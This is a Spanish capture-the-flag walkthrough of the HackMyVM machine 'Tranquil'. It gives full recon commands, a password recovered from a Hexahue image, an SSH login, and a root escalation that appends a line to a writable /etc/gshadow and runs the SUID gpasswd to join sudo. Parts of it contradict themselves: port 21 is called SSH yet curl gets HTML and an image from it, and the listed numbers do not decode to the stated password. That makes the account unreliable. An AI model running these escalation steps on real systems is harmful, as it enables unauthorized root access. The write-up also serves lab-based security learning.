# 🖥️ Tranquil - HackMyVM

> **Dificultad:** Easy  
> **OS:** Debian  
> **IP:** 192.168.0.44  
> **Fecha:** 2026-04-30

---

## 📡 Reconocimiento

```bash
sudo arp-scan -l
```

**Hosts detectados:**
| IP | MAC | Identificación |
|---|---|---|
| 192.168.0.1 | c0:9f:51:83:dd:10 | Router/Gateway |
| 192.168.0.44 | 08:00:27:04:4f:22 | **TARGET** (VirtualBox) |

OUI `08:00:27` corresponde a Oracle VirtualBox — máquina objetivo confirmada.

```bash
ping -c 1 192.168.0.44
# TTL=64 → Linux
```

```bash
nmap -sC -sV -p- --min-rate 5000 -oN nmap_full 192.168.0.44
```

**Resultado:** Solo un puerto abierto con servicio no identificado correctamente:

| Puerto | Servicio detectado | Real |
|--------|-------------------|------|
| 21/tcp | ftp? | **SSH (OpenSSH 8.4p1 Debian)** |

> ⭐ El truco central de la máquina: SSH corriendo en el puerto 21 (puerto FTP estándar). Nmap lo detecta como FTP por el puerto, pero el banner delata que es SSH.

---

## 🔍 Enumeración del servicio — Banner SSH con curl

Intentar conectar con FTP falla. Al lanzar `curl` contra el puerto 21, el servidor devuelve el contenido del banner SSH en texto plano:

```bash
curl http://192.168.0.44:21
```

**Respuesta:**
```html
<img src="tranquil.jpg">

<!-- We are one, humans, computers and ports.
- guru -->
```

Dos pistas extraídas del banner:
- **Usuario:** `guru`
- **Archivo:** `tranquil.jpg`

Descargamos la imagen:

```bash
curl http://192.168.0.44:21/tranquil.jpg -o tranquil.jpg
```

---

## 🎨 Esteganografía — Cifrado Hexahue

La imagen `tranquil.jpg` contiene bloques de colores que codifican un mensaje en **cifrado Hexahue** (cifrado visual basado en grupos de 3 colores).

Decodificamos en [dcode.fr/hexahue-cipher](https://www.dcode.fr/hexahue-cipher):

```
12,5,5,17,4,2,13,14 → KEEPCALM
```

> La contraseña está en **minúsculas**: `keepcalm`

---

## 🔑 Acceso inicial — usuario guru

```bash
ssh -p 21 guru@192.168.0.44
# password: keepcalm
```

```bash
cat ~/user.txt
```

**Flag user:**
```
HMVbecauseweare
```

---

## 🔍 Enumeración post-explotación

```bash
sudo -l
# Sorry, user guru may not run sudo on tranquil.

find / -perm -4000 -type f 2>/dev/null
```

Binarios SUID relevantes:
- `/usr/bin/gpasswd` ← clave para la escalada
- `/usr/bin/newgrp`
- `/usr/bin/sudo`

```bash
ss -tlnp
```

| Puerto | Servicio |
|--------|---------|
| 127.0.0.1:80 | nginx (solo localhost) |
| 0.0.0.0:21 | SSH externo |
| 127.0.0.1:22 | SSH interno |

```bash
find / -writable -type f -not -path "/proc/*" -not -path "/sys/*" 2>/dev/null
# /etc/gshadow  ← único archivo escribible fuera del home
```

```bash
ls -la /etc/shadow
# -rw-r----- 1 root shadow 899
# Legible por el grupo shadow
```

---

## ⬆️ Escalada de privilegios — gshadow + gpasswd SUID

**Cadena de explotación:**

1. `/etc/gshadow` es escribible por `guru`
2. `gpasswd` tiene bit SUID — puede modificar `/etc/group`
3. Si añadimos a `guru` como administrador del grupo `sudo` en gshadow, podemos usar `gpasswd` para añadirlo a `/etc/group`

**Paso 1 — Añadir guru como admin del grupo sudo en gshadow:**

```bash
echo 'sudo:*:guru:' >> /etc/gshadow
```

**Paso 2 — Usar gpasswd (SUID) para añadir guru al grupo sudo en /etc/group:**

```bash
gpasswd -a guru sudo
# Adding user guru to group sudo
```

**Paso 3 — Re-login para aplicar los cambios de grupo:**

```bash
exit
ssh -p 21 guru@192.168.0.44
```

**Paso 4 — Escalar a root:**

```bash
sudo su
# password: keepcalm
```

```bash
cat /root/root.txt
```

**Flag root:**
```
HMVyourfriends
```

---

## 📝 Lecciones aprendidas

- ⭐ **SSH en puerto no estándar** — nmap puede confundirse con el servicio. Siempre verificar el banner manualmente con `curl` o `nc`
- ⭐ **curl contra SSH revela datos ocultos** — el banner puede contener información valiosa en texto plano
- ⭐ **Cifrados visuales (Hexahue)** — no todo el encoding está en texto; revisar imágenes con [dcode.fr](https://www.dcode.fr)
- **gshadow escribible** es una superficie de ataque crítica — permite manipular grupos sin necesitar contraseña de root
- **gpasswd SUID** + gshadow escribible = escalada directa al grupo sudo sin crackear ningún hash
- **Metodología:** no quedarse bloqueado en un vector (crackear hash yescrypt es lento) — buscar alternativas con los mismos primitivos disponibles
